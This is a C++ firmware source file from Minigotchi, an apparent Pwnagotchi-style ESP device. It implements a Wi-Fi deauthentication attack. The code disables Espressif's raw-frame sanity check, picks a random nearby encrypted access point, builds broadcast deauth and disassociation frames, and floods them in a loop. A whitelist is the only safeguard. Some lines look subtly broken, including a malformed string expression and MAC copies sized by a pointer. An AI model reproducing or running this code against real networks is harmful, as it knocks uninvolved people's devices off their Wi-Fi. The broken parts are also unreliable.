/*
 * Minigotchi: An even smaller Pwnagotchi
 * Copyright (C) 2024 dj1ch
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
 * deauth.cpp: handles the deauth of a local AP
 */

#include "deauth.h"

/** developer note:
 *
 * the deauth frame is defined here.
 * this is a raw frame(layer 2)
 * man i hate networking
 *
 */

// for some dumb reason espressif really doesn't like us sending deauth frames,
// so i'll need to make this fix
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2,
                                                int32_t arg3) {
  return 0;
}

// default values before we start
bool Deauth::running = false;
std::vector<String> Deauth::whitelist = {};
String Deauth::randomAP = "";
int Deauth::randomIndex;

/** developer note:
 *
 * instead of using the deauth frame normally, we append information to the
 * deauth frame and dynamically write info to the frame
 *
 */

uint8_t Deauth::deauthTemp[26] = {
    /*  0 - 1  */ 0xC0,
    0x00, // Type, subtype: c0 => deauth, a0 => disassociate
    /*  2 - 3  */ 0x00,
    0x00, // Duration (handled by the SDK)
    /*  4 - 9  */ 0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF, // Reciever MAC (To)
    /* 10 - 15 */ 0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC, // Source MAC (From)
    /* 16 - 21 */ 0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC, // BSSID MAC (From)
    /* 22 - 23 */ 0x00,
    0x00, // Fragment & squence number
    /* 24 - 25 */ 0x01,
    0x00 // Reason code (1 = unspecified reason)
};

uint8_t Deauth::deauthFrame[26];
uint8_t Deauth::disassociateFrame[26];
uint8_t Deauth::broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

void Deauth::add(const std::string &bssids) {
  std::stringstream ss(bssids);
  std::string token;

  // seperate info and whitelist
  while (std::getline(ss, token, ',')) {
    // trim out whitespace
    token.erase(0, token.find_first_not_of(" \t\r\n"));
    token.erase(token.find_last_not_of(" \t\r\n") + 1);

    // add to whitelist
    Serial.print(Mood::neutral + " Adding ");
    Serial.print(token.c_str());
    Serial.println(" to the whitelist");
    Display::updateDisplay(Mood::neutral, "Adding " + (String) + " to the whitelist");
    whitelist.push_back(token.c_str());
  }
}

void Deauth::list() {
  for (const auto &bssid : Config::whitelist) {
    Deauth::add(bssid);
  }
}

bool Deauth::send(uint8_t *buf, uint16_t len, bool sys_seq) {
  delay(102);
  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, sys_seq);
  return (err == ESP_OK);
}

// check if this is a broadcast
// source:
// https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
bool Deauth::broadcast(uint8_t *mac) {
  for (uint8_t i = 0; i < 6; i++) {
    if (mac[i] != broadcastAddr[i])
      return false;
  }

  return true;
}

void Deauth::printMac(uint8_t *mac) {
  for (int i = 0; i < 6; i++) {
    Serial.print(mac[i], HEX);
    if (i < 5) {
      Serial.print(":");
    }
  }

  Serial.println();
}

String Deauth::printMacStr(uint8_t *mac) {
  String macStr = "";
  for (int i = 0; i < 6; i++) {
    if (mac[i] < 16) {
      macStr += "0";
    }
    macStr += String(mac[i], HEX);
    if (i < 5) {
      macStr += ":";
    }
  }
  return macStr;
}

bool Deauth::select() {
  // reset values
  Deauth::randomAP = "";
  Deauth::randomIndex = -1;

  Parasite::sendDeauthStatus(START_SCAN);

  // cool animation, skip if parasite mode
  if (!Config::parasite) {
    for (int i = 0; i < 5; ++i) {
      Serial.println(Mood::looking1 + " Scanning for APs.");
      Display::updateDisplay(Mood::looking1, "Scanning  for APs.");
      delay(Config::shortDelay);
      Serial.println(Mood::looking2 + " Scanning for APs..");
      Display::updateDisplay(Mood::looking2, "Scanning  for APs..");
      delay(Config::shortDelay);
      Serial.println(Mood::looking1 + " Scanning for APs...");
      Display::updateDisplay(Mood::looking1, "Scanning  for APs...");
      delay(Config::shortDelay);
      Serial.println(" ");
      delay(Config::shortDelay);
    }
    delay(Config::longDelay);
  }

  // stop and scan
  Minigotchi::monStop();

  int apCount = 0;
  // If a parasite channel is set, then we want to focus on that channel
  // Otherwise go off on our own and scan for whatever is out there
  if (Parasite::channel > 0) {
    apCount = WiFi.scanNetworks(false, false, Parasite::channel);
  } else {
    apCount = WiFi.scanNetworks();
  }

  if (apCount > 0 && Deauth::randomIndex == -1) {
    Deauth::randomIndex = random(apCount);
    Deauth::randomAP = WiFi.SSID(Deauth::randomIndex);
    uint8_t encType = WiFi.encryptionType(Deauth::randomIndex);

    Serial.print(Mood::neutral + " Selected random AP: ");
    Serial.println(randomAP.c_str());
    Serial.println(" ");
    Display::updateDisplay(Mood::neutral, "Selected random AP: " + randomAP);
    delay(Config::shortDelay);

    if (encType == -1) {
      Serial.println(
          Mood::neutral + " Selected AP is not encrypted. Skipping deauthentication...");
      Display::updateDisplay(
          Mood::neutral,
          "Selected AP is not encrypted. Skipping deauthentication...");
      Parasite::sendDeauthStatus(SKIPPING_UNENCRYPTED);
      return false;
    }

    // check for ap in whitelist
    if (std::find(whitelist.begin(), whitelist.end(), randomAP) !=
        whitelist.end()) {
      Serial.println(Mood::neutral + " Selected AP is in the whitelist. Skipping "
                     "deauthentication...");
      Display::updateDisplay(
          Mood::neutral,
          "Selected AP is in the whitelist. Skipping deauthentication...");
      Parasite::sendDeauthStatus(SKIPPING_WHITELIST);
      return false;
    }

    /** developer note:
     *
     * here we will create the deauth frame using the header,
     * as we find the AP in question we also generate the required information
     * for it as well...
     *
     */

    // clear out exisitng frame...
    std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame),
              0);
    std::fill(std::begin(Deauth::disassociateFrame),
              std::end(Deauth::disassociateFrame), 0);

    // copy template
    std::copy(Deauth::deauthTemp,
              Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
              Deauth::deauthFrame);
    std::copy(Deauth::deauthTemp,
              Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
              Deauth::disassociateFrame);

    Deauth::deauthFrame[0] = 0xC0; // type
    Deauth::deauthFrame[1] = 0x00; // subtype
    Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
    Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)

    Deauth::disassociateFrame[0] = 0xA0; // type
    Deauth::disassociateFrame[1] = 0x00; // subtype
    Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
    Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)

    // bssid
    uint8_t *apBssid = WiFi.BSSID(Deauth::randomIndex);

    // set our mac address
    uint8_t mac[6];
    WiFi.macAddress(mac);

    /** developer note:
     *
     * addr1: reciever addr
     * addr2: sender addr
     * addr3: filtering addr
     *
     */

    // copy our mac(s) to header
    std::copy(Deauth::broadcastAddr,
              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
              Deauth::deauthFrame + 4);
    std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 10);
    std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 16);

    std::copy(Deauth::broadcastAddr,
              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
              Deauth::disassociateFrame + 4);
    std::copy(apBssid, apBssid + sizeof(apBssid),
              Deauth::disassociateFrame + 10);
    std::copy(apBssid, apBssid + sizeof(apBssid),
              Deauth::disassociateFrame + 16);

    if (!broadcast(Deauth::broadcastAddr)) {
      // build deauth
      Deauth::deauthFrame[0] = 0xC0; // type
      Deauth::deauthFrame[1] = 0x00; // subtype
      Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
      Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)

      // reason
      Deauth::deauthFrame[24] = 0x01; // reason: unspecified

      std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::deauthFrame + 10);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::deauthFrame + 16);

      // build disassocaition
      Deauth::disassociateFrame[0] = 0xA0; // type
      Deauth::disassociateFrame[1] = 0x00; // subtype
      Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
      Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)

      std::copy(apBssid, apBssid + sizeof(apBssid),
                Deauth::disassociateFrame + 4);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::disassociateFrame + 10);
      std::copy(Deauth::broadcastAddr,
                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
                Deauth::disassociateFrame + 16);
    }

    Serial.print(Mood::neutral + " Full AP SSID: ");
    Serial.println(WiFi.SSID(Deauth::randomIndex));
    Display::updateDisplay(Mood::neutral,
                           "Full AP SSID: " + WiFi.SSID(Deauth::randomIndex));

    Serial.print(Mood::neutral + " AP Encryption: ");
    Serial.println(WiFi.encryptionType(Deauth::randomIndex));
    Display::updateDisplay(
        Mood::neutral,
        "AP Encryption: " + (String)WiFi.encryptionType(Deauth::randomIndex));

    Serial.print(Mood::neutral + " AP RSSI: ");
    Serial.println(WiFi.RSSI(Deauth::randomIndex));
    Display::updateDisplay(Mood::neutral, "AP RSSI: " +
                                        (String)WiFi.RSSI(Deauth::randomIndex));

    Serial.print(Mood::neutral + " AP BSSID: ");
    printMac(apBssid);
    Display::updateDisplay(Mood::neutral,
                           "AP BSSID: " + Deauth::printMacStr(apBssid));

    Serial.print(Mood::neutral + " AP Channel: ");
    Serial.println(WiFi.channel(Deauth::randomIndex));
    Display::updateDisplay(
        Mood::neutral, "AP Channel: " + (String)WiFi.channel(Deauth::randomIndex));

    Serial.println(" ");
    delay(Config::longDelay);

    Parasite::sendDeauthStatus(PICKED_AP, Deauth::randomAP.c_str(),
                               WiFi.channel(Deauth::randomIndex));

    return true;
  } else if (apCount < 0) {
    Serial.println(Mood::broken + " I don't know what you did, but you screwed up!");
    Serial.println(" ");
    Display::updateDisplay(Mood::broken, "You screwed up somehow!");

    Parasite::sendDeauthStatus(DEAUTH_SCAN_ERROR);

    delay(Config::shortDelay);
  } else {
    // well ur fucked.
    Serial.println(Mood::sad + " No access points found.");
    Serial.println(" ");
    Display::updateDisplay(Mood::sad, "No access points found.");

    Parasite::sendDeauthStatus(NO_APS);

    delay(Config::shortDelay);
  }
  return false;
}

void Deauth::deauth() {
  if (Config::deauth) {
    // select AP
    if (Deauth::select()) {
      if (randomAP.length() > 0) {
        Serial.println(
            Mood::intense + " Starting deauthentication attack on the selected AP...");
        Serial.println(" ");
        Display::updateDisplay(Mood::intense, "Begin deauth-attack on AP...");
        delay(Config::shortDelay);
        // define the attack
        if (!running) {
          start();
        } else {
          Serial.println(Mood::neutral + " Attack is already running.");
          Serial.println(" ");
          Display::updateDisplay(Mood::neutral, "Attack is already running.");
          delay(Config::shortDelay);
        }
      } else {
        // ok why did you modify the deauth function? i literally told you to
        // not do that...
        Serial.println(Mood::broken + " No access point selected. Use select() first.");
        Serial.println(Mood::neutral + " Told you so!");
        Serial.println(" ");
        Display::updateDisplay(Mood::broken,
                               "No access point selected. Use select() first.");
        delay(Config::shortDelay);
        Display::updateDisplay(Mood::neutral, "Told you so!");
        delay(Config::shortDelay);
        return;
      }
    }
  } else {
    // do nothing if deauthing is disabled
  }
}

void Deauth::start() {
  running = true;
  int deauthFrameSize = sizeof(deauthFrame);
  int disassociateFrameSize = sizeof(disassociateFrame);
  int packets = 0;
  unsigned long startTime = millis();

  // packet calculation
  int basePacketCount = 150;
  int rssi = WiFi.RSSI(Deauth::randomIndex);
  int numDevices = WiFi.softAPgetStationNum();

  int packetCount = basePacketCount + (numDevices * 10);
  if (rssi > -50) {
    packetCount /= 2; // strong signal
  } else if (rssi < -80) {
    packetCount *= 2; // weak signal
  }

  Parasite::sendDeauthStatus(START_DEAUTH, Deauth::randomAP.c_str(),
                             WiFi.channel(Deauth::randomIndex));

  // send the deauth 150 times(ur cooked if they find out)
  for (int i = 0; i < packetCount; ++i) {
    if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
        Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      packets++;
      float pps = packets / (float)(millis() - startTime) * 1000;

      // show pps
      if (!isinf(pps)) {
        Serial.print(Mood::intense + " Packets per second: ");
        Serial.print(pps);
        Serial.print(" pkt/s");
        Serial.println(" (AP:" + randomAP + ")");
        Display::updateDisplay(Mood::intense, "Packets per second: " + (String)pps +
                                            " pkt/s" + " (AP:" + randomAP +
                                            ")");
      }
    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
               !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      Serial.println(Mood::broken + " Both packets failed to send!");
      Display::updateDisplay(Mood::broken, "Both packets failed to send!");
    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
               Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      Serial.println(Mood::broken + " Deauthentication failed to send!");
      Display::updateDisplay(Mood::broken, "Deauth failed to send!");
    } else if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
               !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
      Serial.println(Mood::broken + " Disassociation failed to send!");
      Display::updateDisplay(Mood::broken, "Disassoc failed to send!");
    } else {
      Serial.println(Mood::broken + " Unable to calculate pkt/s!");
      Display::updateDisplay(Mood::broken, "Unable to calculate pkt/s!");
    }
  }

  Serial.println(" ");
  Serial.println(Mood::happy + " Attack finished!");
  Serial.println(" ");
  Display::updateDisplay(Mood::happy, "Attack finished!");
  running = false;
}
